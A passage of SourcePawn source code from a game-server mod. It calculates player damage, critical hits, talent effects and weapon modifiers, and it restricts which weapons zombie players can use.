        armor=GetArmor(victim)-(GetIgnoreArmor(attacker)+GetBonusIgnoreArmor(attacker));
      if(red)
      damagemulti *= GetDmgRed(armor, victim);
      damage=RoundToNearest(damagemulti*damage);
      if(GetFear(victim))
      {
        if(GetFearDmg(victim)>damage)
        SetFearDmg(victim,GetFearDmg(victim)-damage);
        else
        RemoveFear(victim);
      }

      if(GetFrostNovaFreeze(victim))
      {
        if(GetFrostNovaFreezeDmg(victim)>damage)
        SetFrostNovaFreezeDmg(victim,GetFrostNovaFreezeDmg(victim)-damage);
        else
        RemoveFrostNovaFreeze(victim);
      }
      wcGetSpellInfo(4,6,"name",line);
      if(GetClass(attacker)==4 && bCS && StrEqual(spellname,line,false))
      wcRunTalent_4_DivineBlood(attacker);
      LowLvlDmg(victim,attacker,damage,false);
      new vlevel = GetLevel(victim);
      new alevel = GetLevel(attacker);
      if(alevel==vlevel && vlevel>=85) {
        damage = KpdRule(attacker, damage, 1, 1);
        damage = KpdRule(victim, damage, 2, 1);
      }
      else
      {
        if(alevel >= vlevel)
          damage = KpdRule(attacker, damage, 1);
        if(vlevel >= alevel)
          damage = KpdRule(victim, damage, 2);
      }
    }
    else //Not Physical, Not Spell.
    {

      if(wc_iPlayerHurtEvent!=0)
      {
        _gameSetHealth(hpRestoreTo,GetClientHealth(hpRestoreTo)-wc_iPlayerHurtEvent+damage);
        wc_iPlayerHurtEvent=0;
      }

      new olddmg=damage;
      new Float:wspeed = GetWeaponSpeed(attacker, true);
      if(wspeed < 1.0)
      wspeed = 1.0;
      damage=RoundToNearest((float(damage)/2.1+float(damage)/200*GetDamage(attacker)) / wspeed);   //Converting to mod damage from console damage.
      if(GetEventInt(event,"hitgroup")==1)
      {
        AddEMsgAff("headshot",true); //show Headshot damage!
        headshot=true;
      }
      if(StrEqual(weaponname, "knife"))
      {
        AddEMsgAff("knife",   true); //show knife damage for every knife hit!
      }

      RunParry(victim,attacker,damage);

      if(GetFear(victim))
      {
        if(GetFearDmg(victim)>olddmg)
        SetFearDmg(victim,GetFearDmg(victim)-olddmg);
        else
        RemoveFear(victim);
      }

      if(GetFrostNovaFreeze(victim))
      {
        if(GetFrostNovaFreezeDmg(victim)>olddmg)
        SetFrostNovaFreezeDmg(victim,GetFrostNovaFreezeDmg(victim)-olddmg);
        else
        RemoveFrostNovaFreeze(victim);
      }
      SetPolymorphOff(victim);

      if(GetStance(attacker)==2)
        damagemulti *= 1.1;
      if(g_iCarry[attacker]>0)
        damagemulti*CTF_NERF;
      if(!bMagicDamage[attacker] || GetMana(attacker) < 3)
      {
        new armormodifier = 0;
        if(GetClass(attacker)==1 && CheckRequirements(attacker,1,2,1,4))
        armormodifier = wcRunTalent_1_PreciseBlows(attacker,victim);
        wcGetTalentInfo(2,2,3,2,attacker,"multi",line);
        new Float:armorreduce = StringToFloat(line);
        new armor=(RoundToNearest(float(GetArmor(victim))*armorreduce))-GetIgnoreArmor(attacker)-armormodifier;
        damagemulti *= GetDmgRed(armor, victim);
      }
      else //Rockbiter "magical" damage
      {
        wcSetMana(attacker, GetMana(attacker) - 3);
        new Float:penetration = 0.0; //Used to be 14.0, before that 11.0
        new armor=GetArmor(victim)-GetIgnoreArmor(attacker);
        new Float:improck=wcRunTalent_6_ImpRock(attacker);
        damagemulti *= (GetSpellReduction(victim,penetration)*(1.0+improck)+GetDmgRed(armor,victim)*(1.0-improck))/2.0;
        //WCMessage(attacker,"testmessageF",attacker,"[rockbiter] penetration",penetration);
        //WCMessage(attacker,"testmessage",attacker,"[rockbiter] armor",armor);
        //WCMessage(attacker,"testmessageF",attacker,"[rockbiter] improck",improck);
        //WCMessage(attacker,"testmessageF",attacker,"[rockbiter] damagemulti",damagemulti);
      }
      damagemulti*=GetWeaponModifier(weaponname,attacker);
      if(CanWearShield(attacker) && HasShield(attacker) && GetClass(attacker)==1)
        damagemulti *= 0.8;
      CalculateCrit(attacker,victim,false,spellname,bCS);
      if(IsMageInvis(attacker))
      {
        SetMageInvis(attacker, false, true);
      }

      //Curse?
      if(hasCurse(attacker))
      damagemulti*=(1.0-getCursePower(attacker));
      damagemulti*=getDamageBuff(attacker);
      if(CheckRequirements(attacker,2,1,4,1))
      {
        new stealth = GetStealth(attacker);
        if((stealth<=240) && (bVanish[attacker]==false) && (stealth>1)) {
          wcGetTalentInfo(2,1,4,1,attacker,"multi",line);
          damagemulti*=1.0 + (float(StringToInt(line))/stealth);
          AddEMsgAff( "shadow blade", true);
          decl Float:location[3];
          GetClientAbsOrigin(attacker,location);
          EmitAmbientSound("wc/spells/strike.wav",location);
        }
      }
      if(CheckRequirements(attacker,2,3,3,2))
      {
        new Float:currenthealth = float(wcGetHealth(victim)) / float(GetMaxHealth(victim));
        if(0.35 >= currenthealth)
        {
          wcGetTalentInfo(2,3,3,2,attacker,"dincrease",line);
          new Float:dincrease = StringToFloat(line);
          damagemulti*=dincrease;
          AddEMsgAff( "dispatch msg", true);
        }
      }
      SetStealth(attacker, 0.0, true);
      if(bCS) {

        wcRunTalentPhysicalCrit(attacker,victim,damagemulti,damage);
        wcGetTalentCritDamageBonus(attacker,line,talentcritdamagebonus,false);
        AddEMsgAff( "critical msg", true);
        SetHolyPower(attacker,GetHolyPower(attacker)+1);
        damagemulti*=(1.5+talentcritdamagebonus)*(1.0 - GetMinusCrit(victim));
      }

      if(wc_aPlayerHurtEvent>0) {
        /*new newar=GetClientArmor(victim);*/
        /*new oldar=wc_aPlayerHurtEvent;*/
        /*wc_aPlayerHurtEvent=0;*/
        /*new delta=oldar-newar;*/
        /*delta=RoundToNearest(float(delta)*float(damage)/float(olddmg)*0.4);*/
        /*newar=oldar-delta;*/
        /*SetEntData(victim, offsArmor, newar);*/
        new cArmor = GetClientArmor(victim);
        if(cArmor > 0 && cArmor < 70)
        SetEntData(victim, offsArmor, 90);


      }
      if(GetClientTeam(victim)!=GetClientTeam(attacker))
      {
        new bool:pass=true;
        if((StrEqual(weaponname,"m3")) || (StrEqual(weaponname,"xm1014")))
        if(GetRandomInt(1,2)==1)
        pass=false;
        wcRunEffects(attacker,victim,damage,false,pass,1,olddmg,weaponname,bonushit,bCS);
        new tmp1=damage;
        wcRunEffects(attacker,victim,damage,false,pass,2,olddmg,weaponname,bonushit,bCS);

        damage=RoundToNearest(damagemulti*damage);
        if(bVanish[attacker])
        {
          decl Float:clienta[3],Float:targeta[3];
          GetClientEyeAngles(attacker, clienta);
          GetClientEyeAngles(victim, targeta);
          new Float:angle=clienta[1]-targeta[1];
          if(angle<0.0)
          angle*=-1.0;
          if(angle>180.0)
          angle = 360.0-angle;
          //if(CheckRequirements(attacker,2,3,2,4))
          //{
          //  wcGetTalentInfo(2,3,2,4,attacker,"multi",line);
          //  angle*=(1-StringToFloat(line));
          //}

          if(angle<=90.0 && IsValidShooting(attacker, victim))
          {
            wcGetTalentInfo(2,3,2,1,attacker,"increment",line);
            new Float:talentbonus=StringToFloat(line);
            damagemulti*=(1.30+talentbonus);
            //damagemulti*=(1.5+talentbonus)*GetWeaponSpeed(attacker, true);

            /*decl String:buffer[30];*/
            /*Format(buffer,sizeof(buffer),"%T", "ambush hit", attacker);*/
            AddEMsgAff( "ambush hit", true);
            if(HasGlyph(attacker, GLYPH_ROGUE_AMBUSH))
            {
              new Float:oldspeed=GetClientSpeed(victim);
              new Float:newspeed=GetNormalSpeed(victim);
              newspeed*=0.5;
              if(newspeed<oldspeed)
              {
                SetClientSpeed(victim,newspeed);
                new Handle:datapack2=CreateDataPack();
                WritePackCell(datapack2,victim); // Write the client index of owner
                WritePackFloat(datapack2,newspeed);
                WritePackFloat(datapack2,0.5);
                CreateTimer(2.0,RemoveSpeedEffect,datapack2,TIMER_HNDL_CLOSE);
              }
            }
            wcGetTalentInfo(2,3,4,2,attacker,"duration",line); //Garrote
            new Float:silence=StringToFloat(line);
            if(silence>0.01)
              AddEMsgAff( "garrote msg", true);
            SetSilence(victim,silence);
            wcRunTalent_2_GarroteDamage(attacker,victim,damage);
          }
          decl color[4];
          for (new x=0;x<=3;x++)
          color[x]=255;
          SetClientColor(attacker,color);
          bVanish[attacker]=false;
        }
        LowLvlDmg(victim,attacker,damage,false);
        new vlevel = GetLevel(victim);
        new alevel = GetLevel(attacker);
        if(alevel==vlevel && vlevel>=85) {
          damage = KpdRule(attacker, damage, 1, 1);
          damage = KpdRule(victim, damage, 2, 1);
        }
        else
        {
          if(alevel >= vlevel)
            damage = KpdRule(attacker, damage, 1);
          if(vlevel >= alevel)
            damage = KpdRule(victim, damage, 2);
        }
        wcRunEffects(attacker,victim,damage,false,pass,3,olddmg,weaponname,bonushit,bCS);
        new tmp2=damage;
        new ragedamage=RoundToNearest(float(tmp2)/float(tmp1)*damagemulti*float(olddmg));
        if(GetClass(attacker)==1)
        {
          if(CheckRequirements(attacker,1,2,2,4) && bCS) //Blood Frenzy
          {
            wcGetTalentInfo(1,2,2,4,attacker,"multi",line); //Blood Frenzy
            new Float:multi=StringToFloat(line);
            ragedamage = RoundToNearest(ragedamage*(1+multi));
            AddEMsgAffAttOnly("Blood Frenzy name", true);
          }
          GenerateRage(attacker,ragedamage);
        }
        if(GetClass(victim)==1)
        GenerateRage(victim,ragedamage,true);
        if(GetClass(attacker)==8)
        wcRunTalent_Vampirism(attacker, damage);
        if(GetClass(attacker)==1)
        wcRunTalent_Rampage(attacker, damage);

        if(StrEqual(weaponname, "knife") && GetClass(attacker)==2)
        {
          wcRunTalent_RogueVampirism(attacker, damage, victim);
        }

    }
      }
    //else  damage=0;
    if(bonushit==1)
    {
      decl String:bsource[255];
      GetEventString(event,"bonussource",bsource,sizeof(bsource));
      AddEMsgAff(bsource, false);
    }
    if(bVanish[victim])
    {
      SetVanishBreakDmg(victim,GetVanishBreakDmg(victim)-damage);
      if(GetVanishBreakDmg(victim)<1)
        bVanish[victim]=false;
    }
    new String:vicName[20];
    GetClientName(victim,vicName,sizeof(vicName));
    AddEMsgDetails(msgId, vicName,damage);
    CastEMsg(msgId, att,vic);
    SetEventInt(event,"dmg_health",damage);
    wcDamageDone[attacker]+=damage;
    wcDamageTaken[victim]+=damage;
    wcDealDamage(victim,attacker,damage,weaponname,headshot);

    //Ghoul heal owner talent
    new owner = GetZombie(victim);
    if(owner > 0 && IsClientInGame(owner) && GetClass(owner) == 8 && wcGetTalentLevel(owner,3,2,3)>0)
    {
      wcGetTalentInfo(8,3,2,3,owner,"multi",line);
      new Float:talentBonus = StringToFloat(line);
      new heal = RoundToCeil(talentBonus * float(damage));
      wcHeal(victim, owner, heal,0,false);
    }

    SpendFreeze(victim,damage);
  }
  return Plugin_Continue;
}

Float:GetWeaponModifier(String:weaponname[],attacker)
{
  new Float:wmulti=1.0;
  if (!strcmp(weaponname,"hegrenade"))
  {
    wmulti*=1.5;
  }
  else if(StrEqual(weaponname,"p90"))
  wmulti*=0.75;
  else if(StrEqual(weaponname,"sg550")) //CT auto sniper
  wmulti*=0.70;
  else if(StrEqual(weaponname,"g3sg1")) //T auto sniper
  wmulti*=0.70;
  else if(StrEqual(weaponname,"scout")) //scout
  wmulti*=1.2;
  else if(StrEqual(weaponname,"awp")) //awp
  wmulti*=1.0;
  else if(StrEqual(weaponname,"m249"))  wmulti *= 0.6;
  else if(StrEqual(weaponname,"knife")) //knife
  {
    wmulti *= 1.30;
    if(!IsBoss() && !IsHNS())
    wmulti*=MaxFloat(1.0, GetWeaponSpeed(attacker, true));
  }
  if(IsBoss())
    if(StrEqual(weaponname,"awp"))
      wmulti*=6.00;
  //new weap = GetEntDataEnt2(victim, ACTIVEWEAPON);
  //if(weap>=0)
  //	{
  //	  decl String:S_weapon[50];
  //	  GetEdictClassname(weap, S_weapon, sizeof(S_weapon));
  //	  if(StrEqual("weapon_knife",S_weapon))
  //   wmulti*=STANCE_KNIFE;
  //	}
  return wmulti;			
}

wcRunEffects(&attacker,&victim,&damage,bool:spell,bool:pass,prio,olddmg,String:source[],bonushit,bool:bCS)
{

  new classVic=GetClass(victim);
  new classAtt=GetClass(attacker);
  new spellid=0;
  new tmp =0;
  new effectid;
  decl String:line[255];
  if(spell)
  {
    for(new x=1;x<=50;x++)
    {
      if((spellid=wcGetSpell(victim,x))!=0)
      {
        wcGetSpellInfo(classVic,spellid,"event",line);
        if(StrContains(line,"player_spellvictim",false)>=0)
        {
          new bool:stop=false;
          wcRunSpell(spellid,classVic,victim,attacker,damage,stop,tmp,tmp,tmp,tmp,prio,victim);
          if (stop)
          break;
        }
      }
    }
    for (new i=1;i<=30;i++)
    {
      if ((effectid=wcEffectsSpellAtt[GetPlayerID(attacker)][i])>0)
      wcShootEffect(effectid,victim,attacker,damage,bCS,0,0,0,0,prio,attacker);
    }
    for (new i=1;i<=30;i++)
    {
      if ((effectid=wcEffectsSpellVic[GetPlayerID(victim)][i])>0)
      wcShootEffect(effectid,victim,attacker,damage,bCS,0,0,0,0,prio,victim);
    }
    wcRunTalentHit(attacker,victim,source,spell,damage,prio,olddmg,bCS,true);
  }
  else if(!spell)
  {
    if(pass)
    {
      if(GetReckoning(attacker)>0 && bonushit!=1 && prio==1)
      {
        SetReckoning(attacker,GetReckoning(attacker)-1);
        if(HasGlyph(attacker, GLYPH_PALADIN_RECKONING))  {
          wcSetMana(attacker, GetMana(attacker)+RoundToNearest(GetMaxMana(attacker)*0.05));
        }
        dealExtraHit(attacker,victim,olddmg,source,"Reckoning");
      }
      if(prio==1)
      shootAutoCasts(attacker, olddmg, victim);
      for(new x=1;x<=50;x++)
      {
        if((spellid=wcGetSpell(attacker,x))!=0)
        {
          wcGetSpellInfo(classAtt,spellid,"event",line);
          if(StrContains(line,"player_attacker",false)>=0)
          {
            wcRunSpell(spellid,classAtt,attacker,victim,damage,bonushit,tmp,tmp,tmp,tmp,prio,attacker);
          }
        }
      }
      for (new i=1;i<=30;i++)
      {
        if ((effectid=wcEffectsAttacker[GetPlayerID(attacker)][i])>0)
        wcShootEffect(effectid,victim,attacker,damage,bCS,damage,bonushit,0,0,prio,attacker);
      }
      RunSealsHit(attacker,victim,damage,prio,GetWeaponModifier(source,attacker),bCS,false,(bonushit==1));
    }

    //Victim Spells + effects
    for(new x=1;x<=50;x++)
    {
      if((spellid=wcGetSpell(victim,x))!=0)
      {
        wcGetSpellInfo(classVic,spellid,"event",line);
        {
          if(StrContains(line,"player_victim",false)>= 0)
          {
            wcRunSpell(spellid,classVic,victim,attacker,damage,bonushit,tmp,tmp,tmp,tmp,prio,victim);
          }
        }
        /*if(bMagicDamage[attacker])
        {
          if(StrContains(line,"player_spellvictim",false)>=0)
          {
            new bool:stop=false;
            wcRunSpell(spellid,classVic,victim,attacker,damage,stop,tmp,tmp,tmp,tmp,prio,victim);
            if (stop)
                break;
          }
        */
      }
    }
    for (new i=1;i<=30;i++)
    {
      if ((effectid=wcEffectsVictim[GetPlayerID(victim)][i])>0)
      {
        wcShootEffect(effectid,victim,attacker,damage,bCS,0,0,0,0,prio,victim);
      }
    }
    wcRunTalentHit(attacker,victim,source,spell,damage,prio,olddmg,bCS, pass);
  }
}


stock CalculateCrit(attacker,victim,bool:spell,String:spellname[],&bool:bCS,bool:heal=false)
{
  new Float:talentcritbonuschance=0.0;
  decl String:line[255];

  if (bCombustion[attacker] && spell && (!heal))
  {
    SetAutoCrit(attacker,true);
    bCombustion[attacker]=false;
    wcGetSpellInfo(3,8,"duration",line);
    new Float:duration=StringToFloat(line);
    new Handle:datapack=CreateDataPack();
    WritePackCell(datapack,attacker);
    CreateTimer(duration,EndColdBlood,datapack,TIMER_HNDL_CLOSE);        //Exactly the same action, removes autocrit from client.
  }
  else if(GetColdBlood(attacker) && (!heal))
  {
    SetAutoCrit(attacker,true);
    SetColdBlood(attacker,false);
    wcGetTalentInfo(2,3,3,1,attacker,"duration",line);
    new Float:duration=StringToFloat(line);
    new Handle:datapack=CreateDataPack();
    WritePackCell(datapack,attacker);
    CreateTimer(duration,EndColdBlood,datapack,TIMER_HNDL_CLOSE);
  }


  wcRunCritBonusChanceTalents(attacker,victim,talentcritbonuschance,spellname);
  new Float:CSchance = GetCriticalStrike(attacker) + talentcritbonuschance;

  //Motel Armor Glyph
  if(IsManaShieldOn(attacker) && HasGlyph(attacker, GLYPH_MAGE_MOLTEN))
  CSchance+=0.03;

  if(!heal)
  CSchance -= GetMinusCritChance(victim);

  if(GetRandomFloat(0.0,1.0) <= CSchance) bCS = true;
  else if(GetClass(attacker)==2 && GetAutoCrit(attacker))
  bCS=true;
  else if(GetClass(attacker)==3 && GetAutoCrit(attacker) && spell)
  bCS=true;
  if(GetBlessedResillience(victim))
  {
    bCS = false;
  }
  if((!heal) && victim == attacker)
  {
    bCS = false; //no crit your self unless it's healing.
  }
}

public Action:OnWeaponCanUse(client, weaponent)
{
  if(CheckCanUseWeapon(client,weaponent))
  {
    return Plugin_Continue; //ALLOW
  }
  return Plugin_Handled;
}

bool:CheckCanUseWeapon(client,weaponent){
  if(!IsZombie(client))
  return true;

  decl String:WeaponName[32];
  GetEdictClassname(weaponent, WeaponName, sizeof(WeaponName));

  if(StrContains(WeaponName,"c4")>-1){ //allow c4
    return true;
  }
  if(StrContains(WeaponName,"knife")>-1){ //allow knife
    return true;
  }
  if(StrContains(WeaponName,"grenade")>-1){ //allow grenades
    return true;
  }

  return false;
}

public Action:DeciSecondTimer(Handle:h,any:a){
  for(new client=1;client<=MaxClients;client++){	
    if(IsClientInGame(client) && IsPlayerAlive(client) && IsZombie(client)){
      new wpnent = GetEntDataEnt2(client,ACTIVEWEAPON);
      if(wpnent>0&&IsValidEdict(wpnent)){


        if (CheckCanUseWeapon(client,wpnent)){
          //allow
        }
        else
        {
          //RemovePlayerItem(client,wpnent);

          //PrintIfDebug(client,"            drop");


          SDKCall(hWeaponDrop, client, wpnent, false, false);
        }

      }
      else{
        //PrintIfDebug(client,"no weapon");
        //PrintToChatAll("no weapon");
      }
      //	}
    }
  }
}
















